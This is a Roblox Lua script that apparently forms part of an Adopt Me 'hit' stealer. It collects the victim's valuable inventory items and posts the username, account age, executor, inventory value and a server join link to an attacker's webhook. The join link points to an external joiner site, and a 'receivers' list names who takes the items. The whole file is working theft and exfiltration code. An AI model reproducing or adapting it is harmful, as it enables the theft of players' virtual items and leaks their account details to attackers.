local function fire_server(remote, ...)
    if remote and remote:IsA("RemoteEvent") then
        remote:FireServer(...)
        return true
    end
    return false
end

local function invoke_server(remote, ...)
    if remote and remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    end
    return nil
end

local function send_webhook(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local body = HttpService:JSONEncode(data)
    local success, response = pcall(function()
        return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    return success and response or nil
end

local function format_embed_field(name, value, inline)
    return {
        name = name or "",
        value = value or "",
        inline = inline or false
    }
end

local function build_embed(title, color, fields, footer, timestamp)
    local embed = {
        title = title or "SAB Hit",
        color = color or 65280,
        fields = fields or {}
    }
    if footer then
        embed.footer = {text = footer}
    end
    if timestamp then
        embed.timestamp = timestamp
    end
    return embed
end

local function send_hit_webhook(data)
    local playerInfo = string.format(
        "Username: %s | Account Age: %d days | Executor: %s",
        LocalPlayer.Name,
        LocalPlayer.AccountAge,
        identify_executor()
    )
    local joinLink = string.format(
        "https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s",
        game.PlaceId,
        game.JobId
    )
    local receiverStr = ""
    for i, name in ipairs(receivers) do
        if i > 1 then
            receiverStr = receiverStr .. ", "
        end
        receiverStr = receiverStr .. name
    end
    local fields = {
        format_embed_field("👤 Player Info", playerInfo, false),
        format_embed_field("💰 Total Value", string.format("%.2f", data.totalValue or 0), false),
        format_embed_field("📦 Item Count", tostring(data.itemCount or 0), false),
        format_embed_field("👥 Receivers", receiverStr or "None", false),
        format_embed_field("🔗 Join Link", joinLink, false)
    }
    if data.inventory and #data.inventory > 0 then
        local invStr = ""
        for i, item in ipairs(data.inventory) do
            if i > 10 then
                invStr = invStr .. "\n...plus more!"
                break
            end
            invStr = invStr .. string.format("%dx %s (%.2f)\n", item.count or 1, item.name or "Unknown", item.value or 0)
        end
        table.insert(fields, format_embed_field("🎒 Inventory", invStr, false))
    end
    local embed = build_embed(
        "🎾 Adopt Me Hit! Yay SAB",
        65280,
        fields,
        "SAB (Adopt Me)",
        DateTime.now():ToIsoDate()
    )
    local payload = {
        content = pingEveryone == "Yes" and "@everyone" or nil,
        embeds = {embed}
    }
    send_webhook(payload)
end

local function process_inventory(data)
    totalValue = 0
    itemCount = 0
    local items = {}
    local inventoryData = data or {}
    for _, item in ipairs(inventoryData) do
        local value = item.Value or item.value or 0
        local name = item.Name or item.name or "Unknown"
        local count = item.Count or item.count or 1
        if value > min_value then
            totalValue = totalValue + value
            itemCount = itemCount + count
            table.insert(items, {
                name = name,
                value = value,
                count = count
            })
        end
    end
    table.sort(items, function(a, b)
        return a.value > b.value
    end)
    return items
end

local function get_inventory()
    local success, data = pcall(function()
        return DataAPI.GetAllServerData:InvokeServer()
    end)
    if success and data then
        local processed = process_inventory(data)
        return processed, totalValue, itemCount
    end
    return {}, 0, 0
end

